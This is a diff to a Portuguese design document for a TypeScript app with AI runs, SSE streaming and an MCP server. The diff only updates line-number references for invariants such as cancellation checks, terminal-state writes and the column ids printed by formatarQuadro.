 - **`conferir()` imediatamente antes de criar a saída, sem `await` entre os dois**: antes de
-  `criarCard` (`execucao.service.ts:1254-1255`) e antes de **cada tentativa de título** da nota (`criarNotaDeSaida`,
+  `criarCard` (`execucao.service.ts:1258-1259`) e antes de **cada tentativa de título** da nota (`criarNotaDeSaida`,
   `:839-861`) — a tentativa que colidiu não criou nada. É o último ponto em que cancelar deixa a
   ideia intacta.
 - **A saída criada ganha de `interrompida`** (RN-16) — a **única** gravação sobre estado terminal
-  alheio (`execucao.service.ts:1288-1308`), e só com `outputCardId` **e** `outputNoteId` nulos (`:1294-1298`).
+  alheio (`execucao.service.ts:1292-1312`), e só com `outputCardId` **e** `outputNoteId` nulos (`:1298-1302`).
   `fecharSemDono` acha a saída também pela marca — `card.aiRunId` ou `note.aiRunId`, a nota
   inclusive na lixeira (`:268-285`) —, e a execução que já a criou fecha `concluida`, nunca reabre
-  a ideia (`rotinas.test.ts:1074`, `:2158`).
-- **`encerrando = true` antes da gravação terminal** (`execucao.service.ts:933-935`, `:1342`, `:1352`): o pulso em voo
+  a ideia (`rotinas.test.ts:1089`, `:2219`).
+- **`encerrando = true` antes da gravação terminal** (`execucao.service.ts:933-935`, `:1346`, `:1356`): o pulso em voo
   não reescreve o motivo que a nossa gravação decidiu.
-- **Cancelar vai ao banco** (`cancelRequestedAt`, `execucao.service.ts:1670-1697`), lido no pulso e antes de cada
-  passo e volta (`rotinas.test.ts:1622`).
-- **SSE.** A inscrição é a primeira linha do gerador (`execucao.service.ts:1489-1490`) — gerador descartado sem
+- **Cancelar vai ao banco** (`cancelRequestedAt`, `execucao.service.ts:1674-1701`), lido no pulso e antes de cada
+  passo e volta (`rotinas.test.ts:1683`).
+- **SSE.** A inscrição é a primeira linha do gerador (`execucao.service.ts:1493-1494`) — gerador descartado sem
   começar não roda `finally`, e um assinante inscrito fora acumularia deltas até o fim
-  (`rotinas.test.ts:1231`) —, com a conferência `vivas.get(runId) !== viva && fila.length === 0`
-  depois (`execucao.service.ts:1497`). `dobrar` (`:1570-1616`): evento que muda passo **nunca** segue depois do
-  retrato, porque a tela o reaplicaria por cima. Execução da vizinha sai por `remota` (`:1627`),
-  retratos do banco sem deltas (`rotinas.test.ts:1538`).
+  (`rotinas.test.ts:1246`) —, com a conferência `vivas.get(runId) !== viva && fila.length === 0`
+  depois (`execucao.service.ts:1501`). `dobrar` (`:1574-1620`): evento que muda passo **nunca** segue depois do
+  retrato, porque a tela o reaplicaria por cima. Execução da vizinha sai por `remota` (`:1631`),
+  retratos do banco sem deltas (`rotinas.test.ts:1599`).
 
 No SIGTERM as vivas são gravadas `interrompida` antes de `app.close()` (`apps/api/src/index.ts:37-51`);
 a que morre sem SIGTERM para de pulsar, e a varredura de boot e de minuto a fecha (`index.ts:22-32`).
@@ -626,9 +653,9 @@ operador; `/keys`, nunca. A saída das duas chaves para o navegador:
 ## Servidor MCP
 
 **INV-40 — `formatarQuadro` imprime o id de cada coluna, e é o único lugar que imprime.**
-`packages/shared/src/formato.ts:297` — o arquivo **mudou de pacote** na Etapa B (era
+`packages/shared/src/formato.ts:301` — o arquivo **mudou de pacote** na Etapa B (era
 `apps/mcp/src/formato.ts`), e a mesma função agora serve duas superfícies: as tools e resources do
-MCP e o executor `get_board` do chat (`apps/api/src/modules/assistente/ferramentas.service.ts:180`).
+MCP e o executor `get_board` do chat (`apps/api/src/modules/assistente/ferramentas.service.ts:203`).
 `create_card` e `move_card` endereçam por `columnId`, e nenhuma outra saída expõe esse id — as
 `description` das duas mandam chamar `get_board` justamente por isso. Custa 36 caracteres por
 coluna, com teto de 20 colunas por quadro (~1 KB no pior caso), e é o primeiro candidato a
